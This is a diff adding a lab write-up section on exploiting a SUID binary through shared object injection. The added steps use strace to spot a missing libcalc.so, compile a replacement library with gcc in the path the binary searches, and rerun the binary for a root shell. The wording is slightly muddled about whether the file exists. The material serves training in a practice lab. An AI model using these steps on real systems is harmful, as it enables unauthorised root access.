@@ -68,6 +68,11 @@
 
 <br />
 
+### [12: SUID / SGID Executables - Shared Object Injection]()
+#### [&nbsp; 12.1: Read and follow along with the above.]()
+
+
+
 
 
 <br />
@@ -966,4 +971,68 @@ No answer needed
 <br/>
 <br/>
 
+### 12: SUID / SGID Executables - Shared Object Injection
 
+<br/>
+
+In this task, the `/usr/local/bin/suid-so` SUID executable is vulnerable to shared object injection. Upon executing the file we notice it is `calculating something`, a progress bar advancing to 99% and the program exiting with the message `Done.`:
+
+```
+/usr/local/bin/suid-so
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172702194-3840343c-d0ff-4d75-b521-75738a22ba75.png)
+
+The `strace` command will help us stack trace all the libraries and files accessed by the executable. Let's run the command with the options provided on the task:
+
+`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
+
+![image](https://user-images.githubusercontent.com/14150485/172703331-10421e49-816f-42e6-b0fc-2d70b7e8b4ce.png)
+
+Apparently, there is a `libcalc.so` file in one of the `/home/user/` subdirectories, however upon attempting to access it the file cannot be found:
+
+```
+cat /home/user/.config/libcalc.so
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172703772-eaf837b7-4f8c-47ed-880c-28a5e3918280.png)
+
+We can `find` the file in the `/home/user/.config/` folder and make a copy of it to another location:
+
+```
+find /home -name 'libcalc*'
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172703975-126c8caf-5902-4c86-8867-ce9d684b1bc6.png)
+
+For the purposes of this task we will stick to the instructions and create a new folder:
+
+```
+mkdir /home/user/.config 
+```
+
+Now we can proceed to create a shared object in the directory the `/usr/local/bin/suid-so` executable was looking in:
+
+```
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+```
+
+Running it again should successfully spawn a root shell for us:
+
+```
+/usr/local/bin/suid-so
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172704932-929322e5-ac72-46a4-897e-d08269beef91.png)
+
+
+<br/>
+
+#### 12.1: Read and follow along with the above.
+
+```
+No answer needed
+```
+
+<br/>
+<br/>
